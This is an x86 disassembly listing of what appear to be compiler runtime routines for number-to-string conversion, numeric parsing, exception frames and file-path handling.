  40635f:	8d 7b 03             	lea    0x3(%ebx),%edi
  406362:	ba 09 00 00 00       	mov    $0x9,%edx
  406367:	9b                   	fwait
  406368:	8a 44 15 e5          	mov    -0x1b(%ebp,%edx,1),%al
  40636c:	8a e0                	mov    %al,%ah
  40636e:	c0 e8 04             	shr    $0x4,%al
  406371:	80 e4 0f             	and    $0xf,%ah
  406374:	66 05 30 30          	add    $0x3030,%ax
  406378:	66 ab                	stos   %ax,%es:(%edi)
  40637a:	4a                   	dec    %edx
  40637b:	75 eb                	jne    0x406368
  40637d:	32 c0                	xor    %al,%al
  40637f:	aa                   	stos   %al,%es:(%edi)
  406380:	8b 7d f8             	mov    -0x8(%ebp),%edi
  406383:	03 7d 08             	add    0x8(%ebp),%edi
  406386:	79 04                	jns    0x40638c
  406388:	33 c0                	xor    %eax,%eax
  40638a:	eb 82                	jmp    0x40630e
  40638c:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  40638f:	72 03                	jb     0x406394
  406391:	8b 7d 0c             	mov    0xc(%ebp),%edi
  406394:	83 ff 12             	cmp    $0x12,%edi
  406397:	73 27                	jae    0x4063c0
  406399:	80 7c 3b 03 35       	cmpb   $0x35,0x3(%ebx,%edi,1)
  40639e:	72 25                	jb     0x4063c5
  4063a0:	c6 44 3b 03 00       	movb   $0x0,0x3(%ebx,%edi,1)
  4063a5:	4f                   	dec    %edi
  4063a6:	78 0d                	js     0x4063b5
  4063a8:	fe 44 3b 03          	incb   0x3(%ebx,%edi,1)
  4063ac:	80 7c 3b 03 39       	cmpb   $0x39,0x3(%ebx,%edi,1)
  4063b1:	77 ed                	ja     0x4063a0
  4063b3:	eb 1f                	jmp    0x4063d4
  4063b5:	66 c7 43 03 31 00    	movw   $0x31,0x3(%ebx)
  4063bb:	ff 45 f8             	incl   -0x8(%ebp)
  4063be:	eb 14                	jmp    0x4063d4
  4063c0:	bf 12 00 00 00       	mov    $0x12,%edi
  4063c5:	c6 44 3b 03 00       	movb   $0x0,0x3(%ebx,%edi,1)
  4063ca:	4f                   	dec    %edi
  4063cb:	78 07                	js     0x4063d4
  4063cd:	80 7c 3b 03 30       	cmpb   $0x30,0x3(%ebx,%edi,1)
  4063d2:	74 f1                	je     0x4063c5
  4063d4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4063d7:	66 8b 56 08          	mov    0x8(%esi),%dx
  4063db:	66 c1 ea 0f          	shr    $0xf,%dx
  4063df:	66 89 03             	mov    %ax,(%ebx)
  4063e2:	88 53 02             	mov    %dl,0x2(%ebx)
  4063e5:	c3                   	ret
  4063e6:	8b 06                	mov    (%esi),%eax
  4063e8:	8b 56 04             	mov    0x4(%esi),%edx
  4063eb:	8b c8                	mov    %eax,%ecx
  4063ed:	0b ca                	or     %edx,%ecx
  4063ef:	0f 84 b4 00 00 00    	je     0x4064a9
  4063f5:	0b d2                	or     %edx,%edx
  4063f7:	79 07                	jns    0x406400
  4063f9:	f7 da                	neg    %edx
  4063fb:	f7 d8                	neg    %eax
  4063fd:	83 da 00             	sbb    $0x0,%edx
  406400:	33 c9                	xor    %ecx,%ecx
  406402:	8b 7d 08             	mov    0x8(%ebp),%edi
  406405:	0b ff                	or     %edi,%edi
  406407:	7d 02                	jge    0x40640b
  406409:	33 ff                	xor    %edi,%edi
  40640b:	83 ff 04             	cmp    $0x4,%edi
  40640e:	7c 1f                	jl     0x40642f
  406410:	bf 04 00 00 00       	mov    $0x4,%edi
  406415:	41                   	inc    %ecx
  406416:	2d 00 00 64 a7       	sub    $0xa7640000,%eax
  40641b:	81 da b3 b6 e0 0d    	sbb    $0xde0b6b3,%edx
  406421:	73 f2                	jae    0x406415
  406423:	49                   	dec    %ecx
  406424:	05 00 00 64 a7       	add    $0xa7640000,%eax
  406429:	81 d2 b3 b6 e0 0d    	adc    $0xde0b6b3,%edx
  40642f:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406432:	89 55 f4             	mov    %edx,-0xc(%ebp)
  406435:	df 6d f0             	fildll -0x10(%ebp)
  406438:	8b d7                	mov    %edi,%edx
  40643a:	b8 04 00 00 00       	mov    $0x4,%eax
  40643f:	2b c2                	sub    %edx,%eax
  406441:	74 07                	je     0x40644a
  406443:	da 34 85 08 5d 40 00 	fidivl 0x405d08(,%eax,4)
  40644a:	df 75 e6             	fbstp  -0x1a(%ebp)
  40644d:	8d 7b 03             	lea    0x3(%ebx),%edi
  406450:	9b                   	fwait
  406451:	0b c9                	or     %ecx,%ecx
  406453:	75 1b                	jne    0x406470
  406455:	b9 09 00 00 00       	mov    $0x9,%ecx
  40645a:	8a 44 0d e5          	mov    -0x1b(%ebp,%ecx,1),%al
  40645e:	8a e0                	mov    %al,%ah
  406460:	c0 e8 04             	shr    $0x4,%al
  406463:	75 1e                	jne    0x406483
  406465:	8a c4                	mov    %ah,%al
  406467:	24 0f                	and    $0xf,%al
  406469:	75 1f                	jne    0x40648a
  40646b:	49                   	dec    %ecx
  40646c:	75 ec                	jne    0x40645a
  40646e:	eb 39                	jmp    0x4064a9
  406470:	8a c1                	mov    %cl,%al
  406472:	04 30                	add    $0x30,%al
  406474:	aa                   	stos   %al,%es:(%edi)
  406475:	b9 09 00 00 00       	mov    $0x9,%ecx
  40647a:	8a 44 0d e5          	mov    -0x1b(%ebp,%ecx,1),%al
  40647e:	8a e0                	mov    %al,%ah
  406480:	c0 e8 04             	shr    $0x4,%al
  406483:	04 30                	add    $0x30,%al
  406485:	aa                   	stos   %al,%es:(%edi)
  406486:	8a c4                	mov    %ah,%al
  406488:	24 0f                	and    $0xf,%al
  40648a:	04 30                	add    $0x30,%al
  40648c:	aa                   	stos   %al,%es:(%edi)
  40648d:	49                   	dec    %ecx
  40648e:	75 ea                	jne    0x40647a
  406490:	8b c7                	mov    %edi,%eax
  406492:	8d 4c 13 03          	lea    0x3(%ebx,%edx,1),%ecx
  406496:	2b c1                	sub    %ecx,%eax
  406498:	c6 07 00             	movb   $0x0,(%edi)
  40649b:	4f                   	dec    %edi
  40649c:	80 3f 30             	cmpb   $0x30,(%edi)
  40649f:	74 f7                	je     0x406498
  4064a1:	8b 56 04             	mov    0x4(%esi),%edx
  4064a4:	c1 ea 1f             	shr    $0x1f,%edx
  4064a7:	eb 07                	jmp    0x4064b0
  4064a9:	33 c0                	xor    %eax,%eax
  4064ab:	33 d2                	xor    %edx,%edx
  4064ad:	88 43 03             	mov    %al,0x3(%ebx)
  4064b0:	66 89 03             	mov    %ax,(%ebx)
  4064b3:	88 53 02             	mov    %dl,0x2(%ebx)
  4064b6:	c3                   	ret
  4064b7:	55                   	push   %ebp
  4064b8:	8b ec                	mov    %esp,%ebp
  4064ba:	83 ec 06             	sub    $0x6,%esp
  4064bd:	57                   	push   %edi
  4064be:	56                   	push   %esi
  4064bf:	53                   	push   %ebx
  4064c0:	8b f0                	mov    %eax,%esi
  4064c2:	8b fa                	mov    %edx,%edi
  4064c4:	8b d9                	mov    %ecx,%ebx
  4064c6:	9b d9 7d fa          	fstcw  -0x6(%ebp)
  4064ca:	9b db e2             	fclex
  4064cd:	d9 2d 26 5d 40 00    	fldcw  0x405d26
  4064d3:	d9 ee                	fldz
  4064d5:	e8 88 00 00 00       	call   0x406562
  4064da:	8a 3e                	mov    (%esi),%bh
  4064dc:	80 ff 2b             	cmp    $0x2b,%bh
  4064df:	74 05                	je     0x4064e6
  4064e1:	80 ff 2d             	cmp    $0x2d,%bh
  4064e4:	75 01                	jne    0x4064e7
  4064e6:	46                   	inc    %esi
  4064e7:	8b ce                	mov    %esi,%ecx
  4064e9:	e8 7f 00 00 00       	call   0x40656d
  4064ee:	33 d2                	xor    %edx,%edx
  4064f0:	8a 06                	mov    (%esi),%al
  4064f2:	3a 05 9b c4 40 00    	cmp    0x40c49b,%al
  4064f8:	75 08                	jne    0x406502
  4064fa:	46                   	inc    %esi
  4064fb:	e8 6d 00 00 00       	call   0x40656d
  406500:	f7 da                	neg    %edx
  406502:	3b ce                	cmp    %esi,%ecx
  406504:	74 4a                	je     0x406550
  406506:	8a 06                	mov    (%esi),%al
  406508:	24 df                	and    $0xdf,%al
  40650a:	3c 45                	cmp    $0x45,%al
  40650c:	75 0a                	jne    0x406518
  40650e:	46                   	inc    %esi
  40650f:	52                   	push   %edx
  406510:	e8 74 00 00 00       	call   0x406589
  406515:	58                   	pop    %eax
  406516:	03 d0                	add    %eax,%edx
  406518:	e8 45 00 00 00       	call   0x406562
  40651d:	80 3e 00             	cmpb   $0x0,(%esi)
  406520:	75 2e                	jne    0x406550
  406522:	8b c2                	mov    %edx,%eax
  406524:	80 fb 01             	cmp    $0x1,%bl
  406527:	75 03                	jne    0x40652c
  406529:	83 c0 04             	add    $0x4,%eax
  40652c:	e8 e3 da ff ff       	call   0x404014
  406531:	80 ff 2d             	cmp    $0x2d,%bh
  406534:	75 02                	jne    0x406538
  406536:	d9 e0                	fchs
  406538:	80 fb 00             	cmp    $0x0,%bl
  40653b:	74 04                	je     0x406541
  40653d:	df 3f                	fistpll (%edi)
  40653f:	eb 02                	jmp    0x406543
  406541:	db 3f                	fstpt  (%edi)
  406543:	9b df e0             	fstsw  %ax
  406546:	66 a9 09 00          	test   $0x9,%ax
  40654a:	75 06                	jne    0x406552
  40654c:	b0 01                	mov    $0x1,%al
  40654e:	eb 04                	jmp    0x406554
  406550:	dd d8                	fstp   %st(0)
  406552:	33 c0                	xor    %eax,%eax
  406554:	9b db e2             	fclex
  406557:	d9 6d fa             	fldcw  -0x6(%ebp)
  40655a:	9b                   	fwait
  40655b:	5b                   	pop    %ebx
  40655c:	5e                   	pop    %esi
  40655d:	5f                   	pop    %edi
  40655e:	8b e5                	mov    %ebp,%esp
  406560:	5d                   	pop    %ebp
  406561:	c3                   	ret
  406562:	ac                   	lods   %ds:(%esi),%al
  406563:	0a c0                	or     %al,%al
  406565:	74 04                	je     0x40656b
  406567:	3c 20                	cmp    $0x20,%al
  406569:	74 f7                	je     0x406562
  40656b:	4e                   	dec    %esi
  40656c:	c3                   	ret
  40656d:	33 c0                	xor    %eax,%eax
  40656f:	33 d2                	xor    %edx,%edx
  406571:	ac                   	lods   %ds:(%esi),%al
  406572:	2c 3a                	sub    $0x3a,%al
  406574:	04 0a                	add    $0xa,%al
  406576:	73 0f                	jae    0x406587
  406578:	da 0d 0c 5d 40 00    	fimull 0x405d0c
  40657e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406581:	da 45 fc             	fiaddl -0x4(%ebp)
  406584:	42                   	inc    %edx
  406585:	eb ea                	jmp    0x406571
  406587:	4e                   	dec    %esi
  406588:	c3                   	ret
  406589:	33 c0                	xor    %eax,%eax
  40658b:	33 d2                	xor    %edx,%edx
  40658d:	8a 0e                	mov    (%esi),%cl
  40658f:	80 f9 2b             	cmp    $0x2b,%cl
  406592:	74 05                	je     0x406599
  406594:	80 f9 2d             	cmp    $0x2d,%cl
  406597:	75 01                	jne    0x40659a
  406599:	46                   	inc    %esi
  40659a:	8a 06                	mov    (%esi),%al
  40659c:	2c 3a                	sub    $0x3a,%al
  40659e:	04 0a                	add    $0xa,%al
  4065a0:	73 0e                	jae    0x4065b0
  4065a2:	46                   	inc    %esi
  4065a3:	6b d2 0a             	imul   $0xa,%edx,%edx
  4065a6:	03 d0                	add    %eax,%edx
  4065a8:	81 fa f4 01 00 00    	cmp    $0x1f4,%edx
  4065ae:	72 ea                	jb     0x40659a
  4065b0:	80 f9 2d             	cmp    $0x2d,%cl
  4065b3:	75 02                	jne    0x4065b7
  4065b5:	f7 da                	neg    %edx
  4065b7:	c3                   	ret
  4065b8:	55                   	push   %ebp
  4065b9:	8b ec                	mov    %esp,%ebp
  4065bb:	53                   	push   %ebx
  4065bc:	56                   	push   %esi
  4065bd:	57                   	push   %edi
  4065be:	33 c0                	xor    %eax,%eax
  4065c0:	55                   	push   %ebp
  4065c1:	68 ee 65 40 00       	push   $0x4065ee
  4065c6:	64 ff 30             	push   %fs:(%eax)
  4065c9:	64 89 20             	mov    %esp,%fs:(%eax)
  4065cc:	e8 c7 f6 ff ff       	call   0x405c98
  4065d1:	e8 9a ec ff ff       	call   0x405270
  4065d6:	e8 d9 ed ff ff       	call   0x4053b4
  4065db:	e8 04 f7 ff ff       	call   0x405ce4
  4065e0:	33 c0                	xor    %eax,%eax
  4065e2:	5a                   	pop    %edx
  4065e3:	59                   	pop    %ecx
  4065e4:	59                   	pop    %ecx
  4065e5:	64 89 10             	mov    %edx,%fs:(%eax)
  4065e8:	68 f5 65 40 00       	push   $0x4065f5
  4065ed:	c3                   	ret
  4065ee:	e9 09 c8 ff ff       	jmp    0x402dfc
  4065f3:	eb f8                	jmp    0x4065ed
  4065f5:	5f                   	pop    %edi
  4065f6:	5e                   	pop    %esi
  4065f7:	5b                   	pop    %ebx
  4065f8:	5d                   	pop    %ebp
  4065f9:	c3                   	ret
  4065fa:	8b c0                	mov    %eax,%eax
  4065fc:	ff 25 44 d2 40 00    	jmp    *0x40d244
  406602:	8b c0                	mov    %eax,%eax
  406604:	e8 f3 ff ff ff       	call   0x4065fc
  406609:	c3                   	ret
  40660a:	8b c0                	mov    %eax,%eax
  40660c:	8b 48 04             	mov    0x4(%eax),%ecx
  40660f:	3b 4a 04             	cmp    0x4(%edx),%ecx
  406612:	77 0c                	ja     0x406620
  406614:	72 0e                	jb     0x406624
  406616:	8b 08                	mov    (%eax),%ecx
  406618:	3b 0a                	cmp    (%edx),%ecx
  40661a:	77 04                	ja     0x406620
  40661c:	72 06                	jb     0x406624
  40661e:	eb 08                	jmp    0x406628
  406620:	31 c0                	xor    %eax,%eax
  406622:	40                   	inc    %eax
  406623:	c3                   	ret
  406624:	83 c8 ff             	or     $0xffffffff,%eax
  406627:	c3                   	ret
  406628:	31 c0                	xor    %eax,%eax
  40662a:	c3                   	ret
  40662b:	90                   	nop
  40662c:	01 10                	add    %edx,(%eax)
  40662e:	83 50 04 00          	adcl   $0x0,0x4(%eax)
  406632:	0f 93 c0             	setae  %al
  406635:	c3                   	ret
  406636:	8b c0                	mov    %eax,%eax
  406638:	53                   	push   %ebx
  406639:	56                   	push   %esi
  40663a:	8b f2                	mov    %edx,%esi
  40663c:	8b d8                	mov    %eax,%ebx
  40663e:	85 db                	test   %ebx,%ebx
  406640:	74 23                	je     0x406665
  406642:	8b c3                	mov    %ebx,%eax
  406644:	e8 07 03 00 00       	call   0x406950
  406649:	8a 00                	mov    (%eax),%al
  40664b:	e8 60 00 00 00       	call   0x4066b0
  406650:	84 c0                	test   %al,%al
  406652:	75 11                	jne    0x406665
  406654:	8b c6                	mov    %esi,%eax
  406656:	b9 7c 66 40 00       	mov    $0x40667c,%ecx
  40665b:	8b d3                	mov    %ebx,%edx
  40665d:	e8 de cc ff ff       	call   0x403340
  406662:	5e                   	pop    %esi
  406663:	5b                   	pop    %ebx
  406664:	c3                   	ret
  406665:	8b c6                	mov    %esi,%eax
  406667:	8b d3                	mov    %ebx,%edx
  406669:	e8 be cb ff ff       	call   0x40322c
  40666e:	5e                   	pop    %esi
  40666f:	5b                   	pop    %ebx
  406670:	c3                   	ret
  406671:	00 00                	add    %al,(%eax)
  406673:	00 ff                	add    %bh,%bh
  406675:	ff                   	(bad)
  406676:	ff                   	(bad)
  406677:	ff 01                	incl   (%ecx)
  406679:	00 00                	add    %al,(%eax)
  40667b:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  40667f:	00 53 56             	add    %dl,0x56(%ebx)
  406682:	8b f2                	mov    %edx,%esi
  406684:	8b d8                	mov    %eax,%ebx
  406686:	8a 44 33 ff          	mov    -0x1(%ebx,%esi,1),%al
  40668a:	50                   	push   %eax
  40668b:	e8 04 de ff ff       	call   0x404494
  406690:	85 c0                	test   %eax,%eax
  406692:	74 13                	je     0x4066a7
  406694:	8b c3                	mov    %ebx,%eax
  406696:	e8 59 cc ff ff       	call   0x4032f4
  40669b:	3b f0                	cmp    %eax,%esi
  40669d:	7d 08                	jge    0x4066a7
  40669f:	b8 02 00 00 00       	mov    $0x2,%eax
  4066a4:	5e                   	pop    %esi
  4066a5:	5b                   	pop    %ebx
  4066a6:	c3                   	ret
  4066a7:	b8 01 00 00 00       	mov    $0x1,%eax
  4066ac:	5e                   	pop    %esi
  4066ad:	5b                   	pop    %ebx
  4066ae:	c3                   	ret
  4066af:	90                   	nop
  4066b0:	3c 5c                	cmp    $0x5c,%al
  4066b2:	74 07                	je     0x4066bb
  4066b4:	3c 2f                	cmp    $0x2f,%al
  4066b6:	74 03                	je     0x4066bb
  4066b8:	33 c0                	xor    %eax,%eax
  4066ba:	c3                   	ret
  4066bb:	b0 01                	mov    $0x1,%al
  4066bd:	c3                   	ret
  4066be:	8b c0                	mov    %eax,%eax
  4066c0:	55                   	push   %ebp
  4066c1:	8b ec                	mov    %esp,%ebp
  4066c3:	83 c4 f8             	add    $0xfffffff8,%esp
  4066c6:	53                   	push   %ebx
  4066c7:	56                   	push   %esi
  4066c8:	57                   	push   %edi
  4066c9:	33 db                	xor    %ebx,%ebx
  4066cb:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4066ce:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4066d1:	8b fa                	mov    %edx,%edi
  4066d3:	8b f0                	mov    %eax,%esi
  4066d5:	33 c0                	xor    %eax,%eax
  4066d7:	55                   	push   %ebp
  4066d8:	68 34 67 40 00       	push   $0x406734
  4066dd:	64 ff 30             	push   %fs:(%eax)
  4066e0:	64 89 20             	mov    %esp,%fs:(%eax)
  4066e3:	8b c6                	mov    %esi,%eax
  4066e5:	e8 fa 01 00 00       	call   0x4068e4
  4066ea:	8b d8                	mov    %eax,%ebx
  4066ec:	85 db                	test   %ebx,%ebx
  4066ee:	75 0e                	jne    0x4066fe
  4066f0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4066f3:	8b cf                	mov    %edi,%ecx
  4066f5:	8b d6                	mov    %esi,%edx
  4066f7:	e8 44 cc ff ff       	call   0x403340
  4066fc:	eb 20                	jmp    0x40671e
  4066fe:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406701:	50                   	push   %eax
  406702:	8b cb                	mov    %ebx,%ecx
  406704:	49                   	dec    %ecx
  406705:	ba 01 00 00 00       	mov    $0x1,%edx
  40670a:	8b c6                	mov    %esi,%eax
  40670c:	e8 43 cd ff ff       	call   0x403454
  406711:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406714:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406717:	8b cf                	mov    %edi,%ecx
  406719:	e8 22 cc ff ff       	call   0x403340
  40671e:	33 c0                	xor    %eax,%eax
  406720:	5a                   	pop    %edx
  406721:	59                   	pop    %ecx
  406722:	59                   	pop    %ecx
  406723:	64 89 10             	mov    %edx,%fs:(%eax)
  406726:	68 3b 67 40 00       	push   $0x40673b
  40672b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40672e:	e8 65 ca ff ff       	call   0x403198
  406733:	c3                   	ret
  406734:	e9 c3 c6 ff ff       	jmp    0x402dfc
  406739:	eb f0                	jmp    0x40672b
  40673b:	5f                   	pop    %edi
  40673c:	5e                   	pop    %esi
  40673d:	5b                   	pop    %ebx
  40673e:	59                   	pop    %ecx
  40673f:	59                   	pop    %ecx
  406740:	5d                   	pop    %ebp
  406741:	c3                   	ret
  406742:	8b c0                	mov    %eax,%eax
  406744:	53                   	push   %ebx
  406745:	56                   	push   %esi
  406746:	57                   	push   %edi
  406747:	55                   	push   %ebp
  406748:	51                   	push   %ecx
  406749:	88 14 24             	mov    %dl,(%esp)
  40674c:	8b f0                	mov    %eax,%esi
  40674e:	8b c6                	mov    %esi,%eax
  406750:	e8 9f cb ff ff       	call   0x4032f4
  406755:	8b f8                	mov    %eax,%edi
  406757:	83 ff 02             	cmp    $0x2,%edi
  40675a:	7c 5d                	jl     0x4067b9
  40675c:	8a 06                	mov    (%esi),%al
  40675e:	e8 4d ff ff ff       	call   0x4066b0
  406763:	84 c0                	test   %al,%al
  406765:	74 52                	je     0x4067b9
  406767:	8a 46 01             	mov    0x1(%esi),%al
  40676a:	e8 41 ff ff ff       	call   0x4066b0
  40676f:	84 c0                	test   %al,%al
  406771:	74 46                	je     0x4067b9
  406773:	bb 03 00 00 00       	mov    $0x3,%ebx
  406778:	33 ed                	xor    %ebp,%ebp
  40677a:	3b fb                	cmp    %ebx,%edi
  40677c:	7c 36                	jl     0x4067b4
  40677e:	8a 44 1e ff          	mov    -0x1(%esi,%ebx,1),%al
  406782:	e8 29 ff ff ff       	call   0x4066b0
  406787:	84 c0                	test   %al,%al
  406789:	74 1a                	je     0x4067a5
  40678b:	45                   	inc    %ebp
  40678c:	83 fd 02             	cmp    $0x2,%ebp
  40678f:	7d 23                	jge    0x4067b4
  406791:	43                   	inc    %ebx
  406792:	3b fb                	cmp    %ebx,%edi
  406794:	7c 1a                	jl     0x4067b0
  406796:	8a 44 1e ff          	mov    -0x1(%esi,%ebx,1),%al
  40679a:	e8 11 ff ff ff       	call   0x4066b0
  40679f:	84 c0                	test   %al,%al
  4067a1:	75 ee                	jne    0x406791
  4067a3:	eb 0b                	jmp    0x4067b0
  4067a5:	8b d3                	mov    %ebx,%edx
  4067a7:	8b c6                	mov    %esi,%eax
  4067a9:	e8 d2 fe ff ff       	call   0x406680
  4067ae:	03 d8                	add    %eax,%ebx
  4067b0:	3b fb                	cmp    %ebx,%edi
  4067b2:	7d ca                	jge    0x40677e
  4067b4:	8b c3                	mov    %ebx,%eax
  4067b6:	48                   	dec    %eax
  4067b7:	eb 60                	jmp    0x406819
  4067b9:	83 ff 01             	cmp    $0x1,%edi
  4067bc:	7c 1c                	jl     0x4067da
  4067be:	8a 06                	mov    (%esi),%al
  4067c0:	e8 eb fe ff ff       	call   0x4066b0
  4067c5:	84 c0                	test   %al,%al
  4067c7:	74 11                	je     0x4067da
  4067c9:	80 3c 24 00          	cmpb   $0x0,(%esp)
  4067cd:	74 07                	je     0x4067d6
  4067cf:	b8 01 00 00 00       	mov    $0x1,%eax
  4067d4:	eb 43                	jmp    0x406819
  4067d6:	33 c0                	xor    %eax,%eax
  4067d8:	eb 3f                	jmp    0x406819
  4067da:	85 ff                	test   %edi,%edi
  4067dc:	7e 39                	jle    0x406817
  4067de:	ba 01 00 00 00       	mov    $0x1,%edx
  4067e3:	8b c6                	mov    %esi,%eax
  4067e5:	e8 96 fe ff ff       	call   0x406680
  4067ea:	8b d8                	mov    %eax,%ebx
  4067ec:	43                   	inc    %ebx
  4067ed:	3b fb                	cmp    %ebx,%edi
  4067ef:	7c 26                	jl     0x406817
  4067f1:	80 7c 1e ff 3a       	cmpb   $0x3a,-0x1(%esi,%ebx,1)
  4067f6:	75 1f                	jne    0x406817
  4067f8:	80 3c 24 00          	cmpb   $0x0,(%esp)
  4067fc:	74 15                	je     0x406813
  4067fe:	3b fb                	cmp    %ebx,%edi
  406800:	7e 11                	jle    0x406813
  406802:	8a 04 1e             	mov    (%esi,%ebx,1),%al
  406805:	e8 a6 fe ff ff       	call   0x4066b0
  40680a:	84 c0                	test   %al,%al
  40680c:	74 05                	je     0x406813
  40680e:	8d 43 01             	lea    0x1(%ebx),%eax
  406811:	eb 06                	jmp    0x406819
  406813:	8b c3                	mov    %ebx,%eax
  406815:	eb 02                	jmp    0x406819
  406817:	33 c0                	xor    %eax,%eax
  406819:	5a                   	pop    %edx
  40681a:	5d                   	pop    %ebp
  40681b:	5f                   	pop    %edi
  40681c:	5e                   	pop    %esi
  40681d:	5b                   	pop    %ebx
  40681e:	c3                   	ret
  40681f:	90                   	nop
  406820:	53                   	push   %ebx
  406821:	56                   	push   %esi
  406822:	57                   	push   %edi
  406823:	55                   	push   %ebp
  406824:	83 c4 f8             	add    $0xfffffff8,%esp
  406827:	88 14 24             	mov    %dl,(%esp)
  40682a:	8b f0                	mov    %eax,%esi
  40682c:	b2 01                	mov    $0x1,%dl
  40682e:	8b c6                	mov    %esi,%eax
  406830:	e8 0f ff ff ff       	call   0x406744
  406835:	8b f8                	mov    %eax,%edi
  406837:	89 7c 24 04          	mov    %edi,0x4(%esp)
  40683b:	8b c6                	mov    %esi,%eax
  40683d:	e8 b2 ca ff ff       	call   0x4032f4
  406842:	8b e8                	mov    %eax,%ebp
  406844:	8d 5f 01             	lea    0x1(%edi),%ebx
  406847:	3b eb                	cmp    %ebx,%ebp
  406849:	7c 34                	jl     0x40687f
  40684b:	8a 44 1e ff          	mov    -0x1(%esi,%ebx,1),%al
  40684f:	e8 5c fe ff ff       	call   0x4066b0
  406854:	84 c0                	test   %al,%al
  406856:	74 11                	je     0x406869
  406858:	80 3c 24 00          	cmpb   $0x0,(%esp)
  40685c:	74 04                	je     0x406862
  40685e:	8b fb                	mov    %ebx,%edi
  406860:	eb 04                	jmp    0x406866
  406862:	8b 7c 24 04          	mov    0x4(%esp),%edi
  406866:	43                   	inc    %ebx
  406867:	eb 12                	jmp    0x40687b
  406869:	8b d3                	mov    %ebx,%edx
  40686b:	8b c6                	mov    %esi,%eax
  40686d:	e8 0e fe ff ff       	call   0x406680
  406872:	03 d8                	add    %eax,%ebx
  406874:	8b c3                	mov    %ebx,%eax
  406876:	48                   	dec    %eax
  406877:	89 44 24 04          	mov    %eax,0x4(%esp)
  40687b:	3b eb                	cmp    %ebx,%ebp
  40687d:	7d cc                	jge    0x40684b
  40687f:	8b c7                	mov    %edi,%eax
  406881:	59                   	pop    %ecx
  406882:	5a                   	pop    %edx
  406883:	5d                   	pop    %ebp
  406884:	5f                   	pop    %edi
  406885:	5e                   	pop    %esi
  406886:	5b                   	pop    %ebx
  406887:	c3                   	ret
  406888:	53                   	push   %ebx
  406889:	56                   	push   %esi
  40688a:	57                   	push   %edi
  40688b:	81 c4 04 f0 ff ff    	add    $0xfffff004,%esp
  406891:	50                   	push   %eax
  406892:	83 c4 fc             	add    $0xfffffffc,%esp
  406895:	8b fa                	mov    %edx,%edi
  406897:	8b f0                	mov    %eax,%esi
  406899:	54                   	push   %esp
  40689a:	8d 44 24 08          	lea    0x8(%esp),%eax
  40689e:	50                   	push   %eax
  40689f:	68 00 10 00 00       	push   $0x1000
  4068a4:	8b c6                	mov    %esi,%eax
  4068a6:	e8 69 cb ff ff       	call   0x403414
  4068ab:	50                   	push   %eax
  4068ac:	e8 8b db ff ff       	call   0x40443c
  4068b1:	89 c3                	mov    %eax,%ebx
  4068b3:	85 db                	test   %ebx,%ebx
  4068b5:	7e 17                	jle    0x4068ce
  4068b7:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  4068bd:	7d 0f                	jge    0x4068ce
  4068bf:	8d 54 24 04          	lea    0x4(%esp),%edx
  4068c3:	8b c7                	mov    %edi,%eax
  4068c5:	8b cb                	mov    %ebx,%ecx
  4068c7:	e8 ac c9 ff ff       	call   0x403278
  4068cc:	eb 09                	jmp    0x4068d7
  4068ce:	8b c7                	mov    %edi,%eax
  4068d0:	8b d6                	mov    %esi,%edx
  4068d2:	e8 55 c9 ff ff       	call   0x40322c
  4068d7:	81 c4 04 10 00 00    	add    $0x1004,%esp
  4068dd:	5f                   	pop    %edi
  4068de:	5e                   	pop    %esi
  4068df:	5b                   	pop    %ebx
  4068e0:	c3                   	ret
  4068e1:	8d 40 00             	lea    0x0(%eax),%eax
  4068e4:	53                   	push   %ebx
  4068e5:	56                   	push   %esi
  4068e6:	57                   	push   %edi
  4068e7:	55                   	push   %ebp
  4068e8:	8b f0                	mov    %eax,%esi
  4068ea:	33 ed                	xor    %ebp,%ebp
  4068ec:	8b c6                	mov    %esi,%eax
  4068ee:	e8 01 ca ff ff       	call   0x4032f4
  4068f3:	8b f8                	mov    %eax,%edi
  4068f5:	b2 01                	mov    $0x1,%dl
  4068f7:	8b c6                	mov    %esi,%eax
  4068f9:	e8 22 ff ff ff       	call   0x406820
  4068fe:	8b d8                	mov    %eax,%ebx
  406900:	43                   	inc    %ebx
  406901:	3b fb                	cmp    %ebx,%edi
  406903:	7c 1b                	jl     0x406920
  406905:	80 7c 1e ff 2e       	cmpb   $0x2e,-0x1(%esi,%ebx,1)
  40690a:	75 05                	jne    0x406911
  40690c:	8b eb                	mov    %ebx,%ebp
  40690e:	43                   	inc    %ebx
  40690f:	eb 0b                	jmp    0x40691c
  406911:	8b d3                	mov    %ebx,%edx
  406913:	8b c6                	mov    %esi,%eax
  406915:	e8 66 fd ff ff       	call   0x406680
  40691a:	03 d8                	add    %eax,%ebx
  40691c:	3b fb                	cmp    %ebx,%edi
  40691e:	7d e5                	jge    0x406905
  406920:	8b c5                	mov    %ebp,%eax
  406922:	5d                   	pop    %ebp
  406923:	5f                   	pop    %edi
  406924:	5e                   	pop    %esi
  406925:	5b                   	pop    %ebx
  406926:	c3                   	ret
  406927:	90                   	nop
  406928:	53                   	push   %ebx
  406929:	56                   	push   %esi
  40692a:	57                   	push   %edi
  40692b:	8b fa                	mov    %edx,%edi
  40692d:	8b d8                	mov    %eax,%ebx
  40692f:	b2 01                	mov    $0x1,%dl
  406931:	8b c3                	mov    %ebx,%eax
  406933:	e8 e8 fe ff ff       	call   0x406820
  406938:	8b f0                	mov    %eax,%esi
  40693a:	57                   	push   %edi
  40693b:	8d 56 01             	lea    0x1(%esi),%edx
  40693e:	b9 ff ff ff 7f       	mov    $0x7fffffff,%ecx
  406943:	8b c3                	mov    %ebx,%eax
  406945:	e8 0a cb ff ff       	call   0x403454
  40694a:	5f                   	pop    %edi
  40694b:	5e                   	pop    %esi
  40694c:	5b                   	pop    %ebx
  40694d:	c3                   	ret
  40694e:	8b c0                	mov    %eax,%eax
  406950:	53                   	push   %ebx
  406951:	8b d8                	mov    %eax,%ebx
  406953:	85 db                	test   %ebx,%ebx
  406955:	75 04                	jne    0x40695b
  406957:	33 c0                	xor    %eax,%eax
